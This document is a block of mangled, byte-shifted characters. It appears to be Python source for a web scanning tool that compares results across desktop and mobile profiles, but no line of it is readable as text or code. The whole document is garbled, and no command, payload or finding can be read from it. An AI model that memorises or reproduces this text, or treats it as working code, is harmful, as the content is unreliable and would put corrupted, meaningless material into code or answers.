(€€€€€€€€€€€€€€€€€€€˜‰¹½ME0É•Ù¥•ÜíÉ•‘…Ñ}ÕÉ°¡™¥¹‘¥¹œ¹ÕÉ°¥ôèÉ•ÅÕ•ÍÐ™…¥±•ˆ¤((€€€‘•˜Í…¸¡Í•±˜¤€´øM…¹I•Á½ÉÐè(€€€€€€€É•Á½ÉÐ€ôM…¹I•Á½ÉÐ¡Í•±˜¹Ñ…É•Ð°Í•±˜¹…Ñ¥Ù”°ÁÉ½™¥±•Ìô¡Í•±˜¹ÁÉ½™¥±”°¤°(€€€€€€€€€€€€€€€€€€€€€€€€€€€Í•ÍÍ¥½¹}Í½ÕÉ”õÍ•±˜¹Í•ÍÍ¥½¸¹Í½ÕÉ”¥˜Í•±˜¹Í•ÍÍ¥½¸•±Í”€‰¹½¹”ˆ¤(€€€€€€€Í•±˜¹}½±±•Ñ}µ•Ñ…‘…Ñ„¡É•Á½ÉÐ¤(€€€€€€€ÍÕ•ÍÍ™Õ±}Á…•Ì°…¹‘¥‘…Ñ•Ì°‘¥Í½Ù•É•‘}É½ÕÑ•Ì€ôÍ•±˜¹}É…Ý°¡É•Á½ÉÐ¤(€€€€€€€¥˜Í•±˜¹…Ñ¥Ù”è(€€€€€€€€€€€Í•±˜¹}ÉÕ¹}…Ñ¥Ù•}ÁÉ½‰•Ì¡É•Á½ÉÐ°…¹‘¥‘…Ñ•Ì¤(€€€€€€€¥˜Í•±˜¹¥¹Ù•¹Ñ½Éå}ÕÉ±Ìè(€€€€€€€€€€€É•Á½ÉÐ¹½Ù•É…”¹…ÁÁ•¹ (€€€€€€€€€€€€€€€˜‰M••‘•í±•¸¡Í•±˜¹¥¹Ù•¹Ñ½Éå}ÕÉ±Ì¥ôP•¹‘Á½¥¹Ð¡Ì¤™É½´„É•‘…Ñ•¥¹Ù•¹Ñ½Éäì€ˆ(€€€€€€€€€€€€€€€€‰…±°É•ÅÕ•ÍÑÌÉ•µ…¥¸ÍÕ‰©•ÐÑ¼¹½Éµ…°Í…¸‰Õ‘•ÑÌ¸ˆ(€€€€€€€€€€€€¤(€€€€€€€¥˜Í•±˜¹…Ñ¥Ù”…¹Í•±˜¹¹½ÍÅ±}ÅÕ•Éäè(€€€€€€€€€€€Í•±˜¹}ÉÕ¹}¹½ÍÅ±}É•Ù¥•ÝÌ¡É•Á½ÉÐ°…¹‘¥‘…Ñ•Ì¤(€€€€€€€¥˜‘¥Í½Ù•É•‘}É½ÕÑ•Ì€ôô€À…¹¹½ÐÍ•±˜¹¥¹Ù•¹Ñ½Éå}ÕÉ±Ìè(€€€€€€€€€€€É•Á½ÉÐ¹½Ù•É…”¹…ÁÁ•¹ (€€€€€€€€€€€€€€€€‰9¼¹…Ù¥…‰±”±¥¹­Ì°P™½É´…Ñ¥½¹Ì½È±¥Ñ•É…°ÍÉ¥ÁÐPÉ½ÕÑ•ÌÝ•É”‘¥Í½Ù•É•¸€ˆ(€€€€€€€€€€€€€€€€‰Q¡¥Ì!QQ@µ½¹±äÍ…¹¹•È…¹¹½Ð•á•ÕÑ”)…Ù…MÉ¥ÁÐ½È½‰Í•ÉÙ”±¥Ù”a!H½™•Ñ ÑÉ…™™¥Œ¸ˆ(€€€€€€€€€€€€¤(€€€€€€€¥˜¹½Ð…¹‘¥‘…Ñ•Ìè(€€€€€€€€€€€É•Á½ÉÐ¹½Ù•É…”¹…ÁÁ•¹ (€€€€€€€€€€€€€€€€‰9¼•±¥¥‰±”ÅÕ•Éä½È™½É´Á…É…µ•Ñ•ÉÌÝ•É”™½Õ¹™½È…Ñ¥Ù”¥¹©•Ñ¥½¸ÁÉ½‰•Ìì€ˆ(€€€€€€€€€€€€€€€€‰é•É¼™¥¹‘¥¹Ì‘½•Ì¹½Ð•ÍÑ…‰±¥Í Ñ¡…ÐÑ¡”…ÁÁ±¥…Ñ¥½¸¥ÌÍ•ÕÉ”¸ˆ(€€€€€€€€€€€€¤(€€€€€€€Õ¹¥ÅÕ”€ôí¥Ñ•´¹¥è¥Ñ•´™½È¥Ñ•´¥¸É•Á½ÉÐ¹™¥¹‘¥¹Íô(€€€€€€€Í•Ù•É¥Ñä€ôì‰É¥Ñ¥…°ˆè€À°€‰¡¥ ˆè€Ä°€‰µ•‘¥Õ´ˆè€È°€‰±½Üˆè€Ì°€‰¥¹™¼ˆè€Ñô(€€€€€€€É•Á½ÉÐ¹™¥¹‘¥¹Ì€ôÍ½ÉÑ•¡Õ¹¥ÅÕ”¹Ù…±Õ•Ì ¤°­•äõ±…µ‰‘„˜è€¡Í•Ù•É¥Ñä¹•Ð¡˜¹Í•Ù•É¥Ñä°€ä¤°˜¹ÕÉ°°˜¹ÉÕ±”°˜¹Á…É…µ•Ñ•È°˜¹¥¤¤(€€€€€€€É•Á½ÉÐ¹Á…•Í}Í…¹¹•€ôÍÕ•ÍÍ™Õ±}Á…•Ì(€€€€€€€É•Á½ÉÐ¹É•ÅÕ•ÍÑÍ}Í•¹Ð€ôÍ•±˜¹É•ÅÕ•ÍÑÍ}Í•¹Ð(€€€€€€€É•ÑÕÉ¸É•Á½ÉÐ(()‘•˜Í…¹}ÁÉ½™¥±•Ì¡Ñ…É•ÐèÍÑÈ°€¨°ÁÉ½™¥±•ÌèÑÕÁ±•mÍÑÈ°€¸¸¹t€ô€ ‰‘•Í­Ñ½Àˆ°€‰µ½‰¥±”ˆ¤°(€€€€€€€€€€€€€€€€€…Ñ¥Ù”è‰½½°€ô…±Í”°µ…á}Á…•Ìè¥¹Ð€ô€ÈÀ°Ñ¥µ•½ÕÐè™±½…Ð€ô€Ô¸À°(€€€€€€€€€€€€€€€€€µ…á}É•ÅÕ•ÍÑÌè¥¹Ð€ô€àÀ°Ù•É¥™å}Ñ±Ìè‰½½°€ôQÉÕ”°(€€€€€€€€€€€€€€€€€Í•ÍÍ¥½¹Ìè‘¥ÑmÍÑÈ°	É½ÝÍ•ÉM•ÍÍ¥½¹tð9½¹”€ô9½¹”°(€€€€€€€€€€€€€€€€€ÁÉ½áäèÍÑÈð9½¹”€ô9½¹”°(€€€€€€€€€€€€€€€€€¥¹Ù•¹Ñ½Éå}ÕÉ±ÌèÑÕÁ±•mÍÑÈ°€¸¸¹t€ô€ ¤°(€€€€€€€€€€€€€€€€€ÍÍÑ¥}…±Ñ•É¹…Ñ•Ìè‰½½°€ô…±Í”°(€€€€€€€€€€€€€€€€€¹½ÍÅ±}ÅÕ•Éäè‰½½°€ô…±Í”¤€´øM…¹I•Á½ÉÐè(€€€€ˆˆ‰IÕ¸¥Í½±…Ñ•ÁÉ½™¥±”Í…¹Ì…¹½µ‰¥¹”É•ÍÕ±ÑÌ¥¸ÍÑ…‰±”½É‘•È¸ˆˆˆ(€€€¥˜¹½ÐÁÉ½™¥±•Ì½È…¹ä¡ÁÉ½™¥±”¹½Ð¥¸AI=%1L™½ÈÁÉ½™¥±”¥¸ÁÉ½™¥±•Ì¤è(€€€€€€€É…¥Í”Y…±Õ•ÉÉ½È ‰ÁÉ½™¥±•ÌµÕÍÐ½¹Ñ…¥¸‘•Í­Ñ½À…¹½½Èµ½‰¥±”ˆ¤(€€€É•Á½ÉÑÌè±¥ÍÑmM…¹I•Á½ÉÑt€ômt(€€€Í…¹¹•ÉÌè‘¥ÑmÍÑÈ°M…¹¹•Ét€ôíô(€€€™½ÈÁÉ½™¥±”¥¸ÁÉ½™¥±•Ìè(€€€€€€€Í…¹¹•È€ôM…¹¹•È¡Ñ…É•Ð°…Ñ¥Ù”õ…Ñ¥Ù”°µ…á}Á…•Ìõµ…á}Á…•Ì°Ñ¥µ•½ÕÐõÑ¥µ•½ÕÐ°(€€€€€€€€€€€€€€€€€€€€€€€€€µ…á}É•ÅÕ•ÍÑÌõµ…á}É•ÅÕ•ÍÑÌ°Ù•É¥™å}Ñ±ÌõÙ•É¥™å}Ñ±Ì°ÁÉ½™¥±”õÁÉ½™¥±”°(€€€€€€€€€€€€€€€€€€€€€€€€€Í•ÍÍ¥½¸ô¡Í•ÍÍ¥½¹Ì½Èíô¤¹•Ð¡ÁÉ½™¥±”¤°ÁÉ½áäõÁÉ½áä°(€€€€€€€€€€€€€€€€€€€€€€€€€¥¹Ù•¹Ñ½Éå}ÕÉ±Ìõ¥¹Ù•¹Ñ½Éå}ÕÉ±Ì°(€€€€€€€€€€€€€€€€€€€€€€€€€ÍÍÑ¥}…±Ñ•É¹…Ñ•ÌõÍÍÑ¥}…±Ñ•É¹…Ñ•Ì°(€€€€€€€€€€€€€€€€€€€€€€€€€¹½ÍÅ±}ÅÕ•Éäõ¹½ÍÅ±}ÅÕ•Éä¤(€€€€€€€Í…¹¹•ÉÍmÁÉ½™¥±•t€ôÍ…¹¹•È(€€€€€€€É•Á½ÉÑÌ¹…ÁÁ•¹¡Í…¹¹•È¹Í…¸ ¤¤(€€€½µ‰¥¹•€ôM…¹I•Á½ÉÐ (€€€€€€€Ñ…É•ÐõÉ•Á½ÉÑÍlÁt¹Ñ…É•Ð°(€€€€€€€…Ñ¥Ù”õ…Ñ¥Ù”°(€€€€€€€Á…•Í}Í…¹¹•õÍÕ´¡É•Á½ÉÐ¹Á…•Í}Í…¹¹•™½ÈÉ•Á½ÉÐ¥¸É•Á½ÉÑÌ¤°(€€€€€€€É•ÅÕ•ÍÑÍ}Í•¹ÐõÍÕ´¡É•Á½ÉÐ¹É•ÅÕ•ÍÑÍ}Í•¹Ð™½ÈÉ•Á½ÉÐ¥¸É•Á½ÉÑÌ¤°(€€€€€€€™¥¹‘¥¹Ìõm™¥¹‘¥¹œ™½ÈÉ•Á½ÉÐ¥¸É•Á½ÉÑÌ™½È™¥¹‘¥¹œ¥¸É•Á½ÉÐ¹™¥¹‘¥¹Ít°(€€€€€€€•ÉÉ½ÉÌõm˜‰íÁÉ½™¥±•ôèí•ÉÉ½Éôˆ™½ÈÁÉ½™¥±”°É•Á½ÉÐ¥¸é¥À¡ÁÉ½™¥±•Ì°É•Á½ÉÑÌ°ÍÑÉ¥Ðõ…±Í”¤™½È•ÉÉ½È¥¸É•Á½ÉÐ¹•ÉÉ½ÉÍt°(€€€€€€€½Ù•É…”õm˜‰íÁÉ½™¥±•ôèí¹½Ñ•ôˆ™½ÈÁÉ½™¥±”°É•Á½ÉÐ¥¸é¥À¡ÁÉ½™¥±•Ì°É•Á½ÉÑÌ°ÍÑÉ¥Ðõ…±Í”¤™½È¹½Ñ”¥¸É•Á½ÉÐ¹½Ù•É…•t°(€€€€€€€ÁÉ½™¥±•ÌõÁÉ½™¥±•Ì°(€€€€€€€Í•ÍÍ¥½¹}Í½ÕÉ”õ¹•áÐ ¡É•Á½ÉÐ¹Í•ÍÍ¥½¹}Í½ÕÉ”™½ÈÉ•Á½ÉÐ¥¸É•Á½ÉÑÌ¥˜É•Á½ÉÐ¹Í•ÍÍ¥½¹}Í½ÕÉ”€„ô€‰¹½¹”ˆ¤°€‰¹½¹”ˆ¤°(€€€€¤(€€€¥˜±•¸¡ÁÉ½™¥±•Ì¤€ôô€Èè(€€€€€€€½µ‰¥¹•¹™¥¹‘¥¹Ì¹•áÑ•¹¡}ÁÉ½™¥±•}‘¥™™•É•¹•Ì¡Í…¹¹•ÉÍmÁÉ½™¥±•ÍlÁut°Í…¹¹•ÉÍmÁÉ½™¥±•ÍlÅut°É•Á½ÉÑÌ¤¤(€€€Í•Ù•É¥Ñä€ôì‰É¥Ñ¥…°ˆè€À°€‰¡¥ ˆè€Ä°€‰µ•‘¥Õ´ˆè€È°€‰±½Üˆè€Ì°€‰¥¹™¼ˆè€Ñô(€€€Õ¹¥ÅÕ”€ôí™¥¹‘¥¹œ¹¥è™¥¹‘¥¹œ™½È™¥¹‘¥¹œ¥¸½µ‰¥¹•¹™¥¹‘¥¹Íô(€€€½µ‰¥¹•¹™¥¹‘¥¹Ì€ôÍ½ÉÑ•¡Õ¹¥ÅÕ”¹Ù…±Õ•Ì ¤°­•äõ±…µ‰‘„™¥¹‘¥¹œè€ (€€€€€€€Í•Ù•É¥Ñä¹•Ð¡™¥¹‘¥¹œ¹Í•Ù•É¥Ñä°€ä¤°™¥¹‘¥¹œ¹ÕÉ°°™¥¹‘¥¹œ¹ÉÕ±”°(€€€€€€€™¥¹‘¥¹œ¹ÁÉ½™¥±”°™¥¹‘¥¹œ¹Á…É…µ•Ñ•È°™¥¹‘¥¹œ¹¥°(€€€€¤¤(€€€É•ÑÕÉ¸½µ‰¥¹•(()‘•˜}½‰Í•ÉÙ…Ñ¥½¹}‘¥™™•É•¹•Ì¡™¥ÉÍÐèM…¹¹•È°Í•½¹èM…¹¹•È°ÕÉ°èÍÑÈ¤€´ø±¥ÍÑmÍÑÉtè(€€€±•™Ð€ô™¥ÉÍÐ¹½‰Í•ÉÙ…Ñ¥½¹Ì¹•Ð¡ÕÉ°¤(€€€É¥¡Ð€ôÍ•½¹¹½‰Í•ÉÙ…Ñ¥½¹Ì¹•Ð¡ÕÉ°¤(€€€¥˜±•™Ð¥Ì9½¹”½ÈÉ¥¡Ð¥Ì9½¹”è(€€€€€€€É•ÑÕÉ¸m˜‰Á…”Ù¥Í¥‰±”½¹±äÑ¼í™¥ÉÍÐ¹ÁÉ½™¥±”¥˜É¥¡Ð¥Ì9½¹”•±Í”Í•½¹¹ÁÉ½™¥±•ô‰t(€€€‘¥™™•É•¹•Ìè±¥ÍÑmÍÑÉt€ômt(€€€¥˜±•™Ð¹ÍÑ…ÑÕÌ€„ôÉ¥¡Ð¹ÍÑ…ÑÕÌè(€€€€€€€‘¥™™•É•¹•Ì¹…ÁÁ•¹¡˜‰ÍÑ…ÑÕÌí™¥ÉÍÐ¹ÁÉ½™¥±•ôõí±•™Ð¹ÍÑ…ÑÕÍô°íÍ•½¹¹ÁÉ½™¥±•ôõíÉ¥¡Ð¹ÍÑ…ÑÕÍôˆ¤(€€€¥˜€¡±•™Ð¹‰½‘å}±•¹Ñ °±•™Ð¹‰½‘å}Í¡„ÈÔØ¤€„ô€¡É¥¡Ð¹‰½‘å}±•¹Ñ °É¥¡Ð¹‰½‘å}Í¡„ÈÔØ¤è(€€€€€€€‘¥™™•É•¹•Ì¹…ÁÁ•¹ (€€€€€€€€€€€˜‰‰½‘äí™¥ÉÍÐ¹ÁÉ½™¥±•ôõ±•¸éí±•™Ð¹‰½‘å}±•¹Ñ¡ô±Í¡„ÈÔØéí±•™Ð¹‰½‘å}Í¡„ÈÔÙlèÄÉuôì€ˆ(€€€€€€€€€€€˜‰íÍ•½¹¹ÁÉ½™¥±•ôõ±•¸éíÉ¥¡Ð¹‰½‘å}±•¹Ñ¡ô±Í¡„ÈÔØéíÉ¥¡Ð¹‰½‘å}Í¡„ÈÔÙlèÄÉuôˆ(€€€€€€€€¤(€€€¥˜±•™Ð¹™½ÉµÌ€„ôÉ¥¡Ð¹™½ÉµÌè(€€€€€€€‘¥™™•É•¹•Ì¹…ÁÁ•¹¡˜‰™½É´Í¥¹…ÑÕÉ•Ì‘¥™™•È€¡í±•¸¡±•™Ð¹™½ÉµÌ¥ôÙÌí±•¸¡É¥¡Ð¹™½ÉµÌ¥ô¤ˆ¤(€€€¥˜±•™Ð¹Á…É…µ•Ñ•ÉÌ€„ôÉ¥¡Ð¹Á…É…µ•Ñ•ÉÌè(€€€€€€€‘¥™™•É•¹•Ì¹…ÁÁ•¹ (€€€€€€€€€€€˜‰Á…É…µ•Ñ•ÉÌí™¥ÉÍÐ¹ÁÉ½™¥±•ôõí±¥ÍÐ¡±•™Ð¹Á…É…µ•Ñ•ÉÌ¥ô°íÍ•½¹¹ÁÉ½™¥±•ôõí±¥ÍÐ¡É¥¡Ð¹Á…É…µ•Ñ•ÉÌ¥ôˆ(€€€€€€€€¤(€€€É•ÑÕÉ¸‘¥™™•É•¹•Ì(()‘•˜}ÁÉ½™¥±•}‘¥™™•É•¹•}™¥¹‘¥¹œ¡™¥ÉÍÐèM…¹¹•È°Í•½¹èM…¹¹•È°ÕÉ°èÍÑÈ°(€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€‘¥™™•É•¹•Ìè±¥ÍÑmÍÑÉt¤€´ø¥¹‘¥¹œè(€€€É•ÑÕÉ¸¥¹‘¥¹œ (€€€€€€€ÉÕ±”ô‰]µAI=%1µ%´ÀÀÄˆ°(€€€€€€€Ñ¥Ñ±”ô‰•Í­Ñ½À½µ½‰¥±”É•ÍÁ½¹Í”ÍÕÉ™…”‘¥™™•ÉÌˆ°(€€€€€€€Í•Ù•É¥Ñäô‰¥¹™¼ˆ°(€€€€€€€½¹™¥‘•¹”ô‰¡¥ ˆ°(€€€€€€€ÕÉ°õÕÉ°°(€€€€€€€ÁÉ½™¥±”ô‰½µÁ…É¥Í½¸ˆ°(€€€€€€€•Ù¥‘•¹”ôˆì€ˆ¹©½¥¸¡‘¥™™•É•¹•Ì¤°(€€€€€€€Ù•Ñ½Èô (€€€€€€€€€€€˜‰I•Á•…ÐPíÉ•‘…Ñ}ÕÉ°¡ÕÉ°¥ôÝ¥Ñ M•Œµ µUµ5½‰¥±”íAI=%1Mm™¥ÉÍÐ¹ÁÉ½™¥±•ulM•Œµ µUµ5½‰¥±”uô€ˆ(€€€€€€€€€€€˜‰…¹íAI=%1MmÍ•½¹¹ÁÉ½™¥±•ulM•Œµ µUµ5½‰¥±”uôì¥¹ÍÁ•ÐÁÉ½™¥±”µÑ…•…¹‘¥‘…Ñ•Ì¸ˆ(€€€€€€€€¤°(€€€€€€€Á…Ñ ô‰ÁÁ±äÑ¡”Í…µ”…ÕÑ¡•¹Ñ¥…Ñ¥½¸°…ÕÑ¡½É¥é…Ñ¥½¸°Ù…±¥‘…Ñ¥½¸°…¹½ÕÑÁÕÐ•¹½‘¥¹œÑ¼•Ù•Éä‘•Ù¥”µÍÁ•¥™¥ŒÉ½ÕÑ”¸ˆ°(€€€€€€€™±…}Á…Ñ ô‰‘•Ù¥”µÍÁ•¥™¥ŒÍÕÉ™…”µ…ä•áÁ½Í”„‘¥ÍÑ¥¹ÐÉ½ÕÑ”½È¥¹ÁÕÐ¸Y…±¥‘…Ñ”¥ÑÌÁÉ½™¥±”µÑ…•™¥¹‘¥¹Ì‰•™½É”™±…œÉ•½Ù•Éä¸ˆ°(€€€€¤(()‘•˜}ÁÉ½™¥±•}‘¥™™•É•¹•Ì¡™¥ÉÍÐèM…¹¹•È°Í•½¹èM…¹¹•È°(€€€€€€€€€€€€€€€€€€€€€€€€É•Á½ÉÑÌè±¥ÍÑmM…¹I•Á½ÉÑt¤€´ø±¥ÍÑm¥¹‘¥¹tè(€€€½ÕÐè±¥ÍÑm¥¹‘¥¹t€ômt(€€€™¥ÉÍÑ}™¥¹‘¥¹Ì€ôì¡¥Ñ•´¹ÕÉ°°¥Ñ•´¹ÉÕ±”°¥Ñ•´¹Á…É…µ•Ñ•È¤™½È¥Ñ•´¥¸É•Á½ÉÑÍlÁt¹™¥¹‘¥¹Íô(€€€Í•½¹‘}™¥¹‘¥¹Ì€ôì¡¥Ñ•´¹ÕÉ°°¥Ñ•´¹ÉÕ±”°¥Ñ•´¹Á…É…µ•Ñ•È¤™½È¥Ñ•´¥¸É•Á½ÉÑÍlÅt¹™¥¹‘¥¹Íô(€€€™¥¹‘¥¹}‘¥™™•É•¹”€ô™¥ÉÍÑ}™¥¹‘¥¹Ì€„ôÍ•½¹‘}™¥¹‘¥¹Ì(€€€ÕÉ±Ì€ôÍ½ÉÑ•¡Í•Ð¡™¥ÉÍÐ¹½‰Í•ÉÙ…Ñ¥½¹Ì¤ðÍ•Ð¡Í•½¹¹½‰Í•ÉÙ…Ñ¥½¹Ì¤¤(€€€™½ÈÕÉ°¥¸ÕÉ±Ìè(€€€€€€€‘¥™™•É•¹•Ì€ô}½‰Í•ÉÙ…Ñ¥½¹}‘¥™™•É•¹•Ì¡™¥ÉÍÐ°Í•½¹°ÕÉ°¤(€€€€€€€±•™Ñ}ÉÕ±•Ì€ôÍ½ÉÑ• ¡ÉÕ±”°Á…É…µ•Ñ•È¤™½È™¥¹‘¥¹}ÕÉ°°ÉÕ±”°Á…É…µ•Ñ•È¥¸™¥ÉÍÑ}™¥¹‘¥¹Ì¥˜™¥¹‘¥¹}ÕÉ°€ôôÕÉ°¤(€€€€€€€É¥¡Ñ}ÉÕ±•Ì€ôÍ½ÉÑ• ¡ÉÕ±”°Á…É…µ•Ñ•È¤™½È™¥¹‘¥¹}ÕÉ°°ÉÕ±”°Á…É…µ•Ñ•È¥¸Í•½¹‘}™¥¹‘¥¹Ì¥˜™¥¹‘¥¹}ÕÉ°€ôôÕÉ°¤(€€€€€€€¥˜±•™Ñ}ÉÕ±•Ì€„ôÉ¥¡Ñ}ÉÕ±•Ìè(€€€€€€€€€€€‘¥™™•É•¹•Ì¹…ÁÁ•¹¡˜‰™¥¹‘¥¹œ­•åÌí™¥ÉÍÐ¹ÁÉ½™¥±•ôõí±•™Ñ}ÉÕ±•Íô°íÍ•½¹¹ÁÉ½™¥±•ôõíÉ¥¡Ñ}ÉÕ±•Íôˆ¤(€€€€€€€¥˜ÕÉ°€ôô™¥ÉÍÐ¹Ñ…É•Ð…¹™¥¹‘¥¹}‘¥™™•É•¹”è(€€€€€€€€€€€±•™Ñ}½¹±ä€ôÍ½ÉÑ•¡™¥ÉÍÑ}™¥¹‘¥¹Ì€´Í•½¹‘}™¥¹‘¥¹Ì¥lèát(€€€€€€€€€€€É¥¡Ñ}½¹±ä€ôÍ½ÉÑ•¡Í•½¹‘}™¥¹‘¥¹Ì€´™¥ÉÍÑ}™¥¹‘¥¹Ì¥lèát(€€€€€€€€€€€‘¥™™•É•¹•Ì¹…ÁÁ•¹ (€€€€€€€€€€€€€€€˜‰ÁÉ½™¥±”µ½¹±ä™¥¹‘¥¹Ìí™¥ÉÍÐ¹ÁÉ½™¥±•ôõí±•™Ñ}½¹±åô°íÍ•½¹¹ÁÉ½™¥±•ôõíÉ¥¡Ñ}½¹±åôˆ(€€€€€€€€€€€€¤(€€€€€€€¥˜‘¥™™•É•¹•Ìè(€€€€€€€€€€€½ÕÐ¹…ÁÁ•¹¡}ÁÉ½™¥±•}‘¥™™•É•¹•}™¥¹‘¥¹œ¡™¥ÉÍÐ°Í•½¹°ÕÉ°°‘¥™™•É•¹•Ì¤¤(€€€É•ÑÕÉ¸½ÕÐ(